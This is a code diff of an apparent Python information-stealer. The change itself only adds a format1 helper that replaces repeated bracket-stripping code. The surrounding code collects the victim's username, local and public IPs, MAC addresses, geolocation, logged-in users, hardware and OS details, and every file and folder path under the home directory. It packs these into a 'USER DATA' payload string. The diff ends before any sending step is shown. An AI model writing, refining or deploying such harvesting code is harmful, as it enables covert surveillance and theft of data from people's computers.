@@ -8,6 +8,11 @@ import platform
 import datetime
 import requests
 home = pathlib.Path.home()
+def format1(s, path=False):
+	if not path:
+		return str(s).replace("[","").replace("]","")
+	return str(s).replace("[","").replace("]","").replace(",","\r\n")
+		
 def run_paths():
 	f = []
 	d = []
@@ -17,6 +22,7 @@ def run_paths():
 		elif p.is_file():
 			f.append(str(p))
 	return d, f
+	
 def get_ip():
     try:
         ipv4 = []
@@ -33,41 +39,45 @@ def get_ip():
         return ipv4, ipv6, mac
     except Exception as e:
         return str(e)
+        
 def public_ip():
 	req = requests.get("https://api64.ipify.org/")
 	if req.status_code == 200:
 		return req.text
 	else:
 		return req.status_code
+		
 def ip_info():
 	r = requests.get("http://ip-api.com/json/")
 	if r.status_code == 200:
 		j = json.loads(r.text)
 		return j
 	return None
+	
 def logged():
 	u = []
 	for it in psutil.users():
 		u.append(it.name)
 	return u
+	
 user = getpass.getuser()
 exe = pathlib.Path(sys.executable).name
 pts = run_paths()
 time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
 i = get_ip()
 i_info = ip_info()
-lo = str(logged()).replace("[","").replace("]","")
+lo = format1(logged())
 cc = psutil.cpu_count()
 cf = psutil.cpu_freq().current
 ram = psutil.virtual_memory().total // 1024 // 1024
-i4 = str(i[0]).replace("[","").replace("]","")
-i6 = str(i[1]).replace("[","").replace("]","")
-mc = str(i[2]).replace("[","").replace("]","")
+i4 = format1(i[0])
+i6 = format1(i[1])
+mc = format1(i[2])
 sy = platform.system()
 nd = platform.node()
 re = platform.release()
-d_path = str(pts[0]).replace("[","").replace("]","").replace(",","\r\n")
-f_path = str(pts[1]).replace("[","").replace("]","").replace(",","\r\n")
+d_path = format1(pts[0], path=True)
+f_path = format1(pts[1], path=True)
 payload = f"""
 ---------- 𝐔𝐒𝐄𝐑 𝐃𝐀𝐓𝐀 ----------
 
